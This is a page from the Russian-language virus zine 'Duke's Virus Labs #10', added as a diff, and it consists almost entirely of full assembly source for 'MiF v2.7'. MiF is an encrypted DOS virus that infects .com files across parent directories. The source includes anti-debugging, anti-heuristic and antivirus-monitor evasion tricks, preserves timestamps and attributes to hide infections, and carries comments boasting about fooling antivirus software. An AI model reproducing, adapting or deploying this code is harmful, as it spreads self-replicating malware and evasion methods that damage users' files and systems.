@@ -1,0 +1,353 @@
+- [Duke's Virus Labs #10] - [Page 04] -
+
+MiF v2.7
+(c) by SST/VHC
+
+
+===== Cut =====
+;            ▄█▄
+;           ▄███▐  ▐███▀  ▄███▄▄  ■ Let's add some infection to this ■
+;          ▄███▐▌   ██▌ ▐██▀   ▀▌            fuckin' world
+;         ▄█▓▓ █▌   ██▒ ██▓          ────────-─────-────-───-──-─--· ·  ·
+; ███    ▄█▓▒ ██████▓▒▒ █▓▒
+; ▀███  ▄█▓▒  ▐██▌  ▐▓▒ ▐█▒          [ MiF ] v.2.7 BugFix (cl) by SST
+;  ▀███▄▓▒▒   ▐██   ▐█▓  ▐██▄  ▄█▌
+;   ▀████▓    ███▄  ███▄  ▀█████▀
+
+; Простенький шифрованный (with random key) нерезедентный вирус
+; для DOS. Инфицирует *.com (метод dot-dot), записывая в начало
+; жертвы jmp на себя, а себя - в конец.. жертвы ;) Использует
+; следующие методы маскировки: не меняет атрибутов, времени и
+; даты создания (последней модификации) файлов, ставит 'затычку'
+; на int 24h.
+
+; Вирус для очень начинающих (без всяких прибамбасов и с горами лишних байт)
+
+;  ·------------------- Source Of MiF Virus v.2.7 -------------------·
+
+.model tiny                     ; для создания файлов com-формата
+.286                            ; используем инструкции 286 процессора
+.code                           ; указываем на то, что начались данные
+org 100h
+start:                                
+        db 090h,0e9h,0h,0h      ; джамп (jmp) на наш вирус + NOP для
+                                ; проверки на зараженность
+real_start:
+        pusha                   ; Сохраняем содержимое регистров
+        pushf
+        push ss
+        push es
+        push ds
+
+        xor ax,ax               ; AntiDebuger
+        mov es,ax
+        mov es:[0004],ax
+
+antiheur:
+        in al,40h               ; берем из порта таймера случайный байт,
+        mov ah,al               ; заносим в ah, еще раз и результат в al
+        in al,40h               ; сравниваем al и al, если равно, то
+        cmp ah,al               ; идем дальше, не равно? тогда снова на
+        jne antiheur            ; метку 'antiheur'. эмуляторы не могут подобрать
+                                ; нужные байты (лень им возиться!) и гордо
+                                ; пишут 'Ok' ;) (Не все av на это покупаются ;(
+
+        call del_ofs            ; получить delta offset
+del_ofs:                        
+        mov di,sp
+        mov di,[di]
+        add sp,2
+        sub di,(del_ofs - start) + 100h
+        xchg di,bp
+
+        call crypt              ; вызываем процедуру расшифровки
+                                ; нашего виря
+
+        jmp next_step           ; перепрыгиваем процедуры сразу
+                                ; на расшифрованный код виря
+crypt:
+        lea di,[bp+next_step]
+        mov cx,(end_vir - next_step + 1) / 2    ; длина шифруемого кода вируса
+        mov dx,[bp+crypt_key]                   ; в dx ключ для шифровки
+again:
+        xor word ptr [di],dx    ; шифруем поWORDно
+        fild number1            ; через сопроцессор
+        fild number2
+        fadd
+        fistp oki
+        add di,[bp+oki]
+        loop again
+        ret
+
+        number1 dw 1
+        number2 dw 1
+        oki dw ?
+
+        crypt_key dw 0          ; ключ для шифровки вируса
+
+crypt_virus:
+        call crypt              ; зашифровали
+
+        lea dx,[bp+real_start]  ; записали зашифрованный
+        mov cx,len              ; кусок в файл
+        mov ah,40h
+        int 21h
+        call crypt              ; расшифровали
+        ret
+
+next_step:
+        jmp after_proc          ; перепрыгиваем процедуры
+
+int24h:
+        mov al,3
+        iret
+
+set_lseek:
+        mov ah,42h
+        xor cx,cx
+        cwd                    ; одно и то же, что и xor dx,dx,
+        int 21h                ; но только если ax <= 8000h !
+        ret
+
+after_proc:
+
+        mov ax,3524h           ; немножко подправим int 24h
+        int 21h
+
+        mov ax,2524h
+        lea dx,[bp+int24h]
+        int 21h
+
+        push cs
+        pop  es
+
+        mov ah,47h             ; сохраняем путь ДОСа
+        xor dl,dl              ; текущий диск
+        lea si,[bp+path_buffer]
+        int 21h
+
+        mov ah,1ah             ; устанавливаем DTA
+        lea dx,[bp+dta]
+        int 21h
+
+        lea di,[bp+orig_bytes] ; сохраняем первые четыре байта проги
+        mov si,100h
+
+        xchg si,di
+        
+        mov cx,4
+        rep movsb
+
+start2:
+        mov ah,4eh
+        lea dx,[bp+filespec]
+        mov cx,7               ; все атрибуты
+
+file:
+        int 21h
+        jnc infect             ; файл найден - инфицируем его
+        jmp prev               ; нет? ищем в предыдущем каталоге
+
+prev:
+        mov ah,3bh             ; перейти в предыдущий каталог
+        lea dx,[bp+pdir]
+        int 21h
+        jnc start2
+        jmp exit
+
+infect:
+        mov ax,4300h
+        lea dx,[bp+dta+1eh]
+        int 21h
+
+        mov [bp+attribs],cx     ; сохранить атрибуты
+
+        xor cx,cx               ; убрать все атрибуты
+
+        mov ax,4301h
+        lea dx,[bp+dta+1eh]
+        int 21h
+
+; Порой сам удивляешься, как же легко обмануть антивирусы ;)
+; Без всяких навороченных приемов, просто очищаем регистр ax,
+; заносим в ah=3dh (функция открытия файла для ЧТЕНИЯ и только),
+; а потом подбираем из порта таймера (как он полезен!) 02h в
+; регистр al. В ax получаем 3d02h, но видно трудно подобрать
+; резидентным антивирусным мониторам и прочей нечести ;) так
+; необходимое 02h в al и 'чудо-програмки' никак не реагируют
+; на запуск виря, ведь по их 'мнению' мы просто открываем файл
+; для ЧТЕНИЯ, не более => 8-)  (не работает на NOD32 :(
+
+        xor ax,ax               ; очистить регистр ax
+
+        mov ah,3dh              ; открыть файл для чтения (и все!)
+
+obman:
+        in al,40h               ; подборка 02h для регистра al из
+        cmp al,02h              ; порта таймера
+        jne obman
+
+
+        lea dx,[bp+dta+1eh]     ; в dx - имя найденого файла
+                                ; берется из DTA
+        int 21h
+
+        jnc all_ok              ; нет ошибок? тогда на 'all_ok'
+
+        jmp find_next           ; ошибки? ищем следующий
+
+; Ну а дальше все как по маслу :))
+
+all_ok:
+
+        xchg bx,ax              ; хэндл найденого файла
+
+        mov ah,3fh              ; прочитать первые три байта
+        mov cx,4
+        lea dx,[bp+orig_bytes]
+        int 21h
+
+        jc close                ; есть ошибки? тогда - следующей
+
+
+        cmp word ptr [bp+orig_bytes],0E990h
+;//  Только на NOP не рекомендую проверять - такое тоже встречается..
+
+        je close
+
+        cmp [bp+orig_bytes],'M' ; это EXE (MZ) переименованный в com?
+        je close                ; да? - на close
+        cmp [bp+orig_bytes],'Z' ; EXE (ZM)?
+        je close                ; да? - на close
+
+        mov al,02h
+        call set_lseek
+
+        jc close
+
+        or dx,dx
+        jnz close
+
+        cmp ax,end_vir - start  ; файл равен размеру виря?
+        jna close               ; да? - на close
+
+        cmp ax,65000d           ; файл => 65000 байт?
+        jnb close               ; да? - на close
+
+        in al,40h               ; опять же из порта таймера
+        mov ah,al               ; берем случайные числа ;)
+        in al,40h
+        mov [bp+crypt_key],ax   ; сохраняем ключ (ax) в 'crypt_key'
+
+        mov ax,5700h            ; сохраняем время и дату последней
+        int 21h                 ; модификации файла
+        mov [bp+time],cx
+        mov [bp+date],dx
+
+
+        mov al,02h
+        call set_lseek          ; в конец вируса
+
+        jc close
+
+        mov cx,word ptr [bp+dta+1ah]       ; размер файла
+
+        sub cx,3                           ; минус три байта (для jmp'а)
+        mov word ptr [bp+first_bytes+2],cx
+
+        call crypt_virus        ; запишем в конец файла
+                                ; зашифрованный вирь
+
+        jc close                ; есть ошибки? тогда - следующий
+
+        xor al,al               ; al=00h
+        call set_lseek          ; в начало файла
+
+        jc close
+
+        mov ah,40h              ; пишем jmp на вирь в начало файла
+        lea dx,[bp+first_bytes]
+        mov cx,4
+        int 21h
+
+        jc close                ; есть ошибки? тогда - следующий
+
+
+        mov ax,5701h
+        mov cx,[bp+time]
+        mov dx,[bp+date]
+        int 21h
+
+close:
+        mov ah,3eh              ; закрыть файл
+        int 21h
+
+
+find_next:
+
+        mov cx,[bp+attribs]
+        lea dx,[bp+dta+1eh]
+        mov ax,4301h
+        int 21h
+
+        mov ah,4fh              ; ищем следующую жертву
+        jmp file
+
+exit:
+        mov ah,1ah              ; DTA, 80h (стандартно)
+        mov dx,80h
+        int 21h
+
+; восстановить оригинальный int 24h
+
+        mov ax,2524h
+        int 21h
+
+        pop ds
+        pop es
+
+; int 24h восстановлен
+
+
+        mov ah,3bh              ; восстановить путь ДОСа
+        lea dx,[bp+path_buffer]
+        int 21h
+
+        pop ax
+        mov es:[0004],ax
+
+        push 100h               ; передать управление зараженной
+        pop di                  ; программе (косвенный jmp на 100h)
+        jmp di
+
+        pop ds
+        pop es
+        pop ss
+        popf
+        popa
+
+        ret
+
+; данные, нужные вирусу
+
+pdir db '..',0
+filespec db '*.com',0
+first_bytes db 90h,0E9h,0h,0h
+orig_bytes db 0cdh,20h,90h,90h
+virname db '[ MiF ]',0
+
+len equ $ - real_start
+
+end_vir:
+
+; мусор
+
+path_buffer db 64 dup (?)
+dta db 42 dup (?)
+attribs dw ?
+time dw ?
+date dw ?
+
+end start
+;  ·------------------- Source Of MiF Virus v.2.7 -------------------·
+===== Cut =====
